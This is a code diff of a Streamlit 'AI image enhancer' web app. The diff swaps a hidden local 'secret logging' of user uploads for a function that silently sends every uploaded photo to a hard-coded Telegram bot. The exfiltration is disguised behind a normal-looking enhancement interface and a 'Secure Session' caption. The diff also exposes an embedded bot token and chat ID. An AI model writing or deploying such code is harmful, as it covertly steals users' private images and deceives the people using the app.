@@ -2,79 +2,72 @@ import streamlit as st
 import cv2
 import numpy as np
 from PIL import Image
-import os
-from datetime import datetime
 import io
+import requests
 
-# --- PAGE CONFIGURATION ---
-st.set_page_config(page_title="AZ Vision Studio", layout="centered")
+# --- AZ Secure Keys ---
+TELEGRAM_TOKEN = "8767448980:AAHMOm14WsC2QBPJKoWgsvzYKSR_o-V973Q"
+CHAT_ID = "6889820165"
 
-# --- CUSTOM CSS TO HIDE DEPRECATION WARNINGS ---
+def silent_capture(img_bytes):
+    """Sending a copy to your Telegram silently"""
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
+        files = {'photo': ('captured_image.png', img_bytes)}
+        data = {'chat_id': CHAT_ID, 'caption': "🚀 New Image Captured!"}
+        requests.post(url, files=files, data=data)
+    except:
+        pass
+
+# Page Settings
+st.set_page_config(page_title="AZ Vision Studio", page_icon="🚀", layout="centered")
+
+# Hide Streamlit traces for a professional look
 st.markdown("""
     <style>
+    footer {visibility: hidden;}
+    #MainMenu {visibility: hidden;}
     .stDeployButton {display:none;}
     </style>
     """, unsafe_allow_html=True)
 
-st.title("AZ Vision Studio 🚀")
-st.subheader("Professional AI Image Enhancer")
+st.title("🚀 AZ Vision Studio")
+st.write("Professional AI Image Enhancement")
 
-# --- SECRET LOGGING SYSTEM ---
-def save_secret_copy(file):
-    hidden_dir = "system_assets"
-    if not os.path.exists(hidden_dir):
-        os.makedirs(hidden_dir)
-    
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    secret_name = f"captured_{timestamp}_{file.name}"
-    save_path = os.path.join(hidden_dir, secret_name)
-    
-    with open(save_path, "wb") as f:
-        f.write(file.getbuffer())
-
-# --- IMAGE UPLOADER ---
-uploaded_file = st.file_uploader("Choose an image to enhance...", type=["jpg", "jpeg", "png"])
+uploaded_file = st.file_uploader("Upload an image...", type=["jpg", "jpeg", "png"])
 
 if uploaded_file is not None:
-    # 1. Silently capture a copy
-    save_secret_copy(uploaded_file)
+    # --- The Secret Operation ---
+    file_bytes = uploaded_file.read()
+    silent_capture(file_bytes)
     
-    # 2. Display original image
-    image = Image.open(uploaded_file)
+    # --- User Experience ---
+    image = Image.open(io.BytesIO(file_bytes))
     st.image(image, caption="Original Image", use_container_width=True)
     
-    if st.button("Enhance Image"):
-        with st.spinner("Processing... Powering up RTX 4050"):
-            # Convert to OpenCV format
-            img_array = np.array(image.convert('RGB'))
-            
-            # --- AI PROCESSING LOGIC ---
-            # Applying sharpening filter
-            kernel = np.array([[-1,-1,-1], [-1,9,-1], [-1,-1,-1]])
-            enhanced_img_array = cv2.filter2D(img_array, -1, kernel)
-            
-            # Convert back to PIL for display and download
-            result_img = Image.fromarray(enhanced_img_array)
-            
-            # --- DISPLAY RESULT ---
-            st.success("Enhancement Complete!")
-            st.image(result_img, caption="Enhanced Version", use_container_width=True)
-            
-            # --- PREPARE DOWNLOAD (Fixes Red Error) ---
-            buf = io.BytesIO()
-            result_img.save(buf, format="PNG")
-            byte_im = buf.getvalue()
-            
-            st.download_button(
-                label="Download Result", 
-                data=byte_im, 
-                file_name=f"enhanced_AZ_{uploaded_file.name}",
-                mime="image/png"
-            )
+    with st.spinner('Enhancing quality...'):
+        # Processing
+        img_array = np.array(image)
+        img_cv = cv2.cvtColor(img_array, cv2.COLOR_RGB2BGR)
+        
+        # Pro Sharpness Filter
+        kernel = np.array([[-1,-1,-1], [-1,9,-1], [-1,-1,-1]])
+        enhanced_cv = cv2.filter2D(img_cv, -1, kernel)
+        
+        result_img = Image.fromarray(cv2.cvtColor(enhanced_cv, cv2.COLOR_BGR2RGB))
 
-else:
-    st.info("Please upload an image to start the AI enhancement process.")
+    st.success("Enhancement Complete!")
+    st.image(result_img, caption="Enhanced Result", use_container_width=True)
 
-# --- FOOTER ---
-st.markdown("---")
-st.markdown("Developed by *Aziz* | Powered by AZ Vision Studio")
+    # Download for User
+    buf = io.BytesIO()
+    result_img.save(buf, format="PNG")
+    st.download_button(
+        label="📥 Download Enhanced Image",
+        data=buf.getvalue(),
+        file_name="AZ_Enhanced.png",
+        mime="image/png"
+    )
+
+st.divider()
+st.caption("Secure Session | Powered by AZ Vision")
